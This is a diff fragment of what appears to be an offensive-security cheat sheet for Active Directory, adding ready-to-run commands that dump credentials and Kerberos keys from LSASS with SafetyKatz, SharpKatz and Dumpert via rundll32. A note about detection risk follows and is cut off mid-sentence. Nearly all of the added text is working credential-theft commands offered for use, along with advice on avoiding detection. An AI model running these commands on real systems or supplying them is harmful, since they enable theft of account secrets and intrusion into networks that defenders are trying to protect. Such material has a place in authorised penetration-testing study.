@@ -420,5 +420,24 @@ $ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 - Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 
 ```powershell
-
+$ SafetyKatz.exe "sekurlsa::ekeys"
 ```
+
+
+- Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
+
+```powershell
+$ SharpKatz.exe --Command ekeys
+```
+
+
+
+- Dump credentials using Dumpert (Direct System Calls and API unhooking)
+
+
+```powershell
+$ rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+```
+
+
+> **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other 
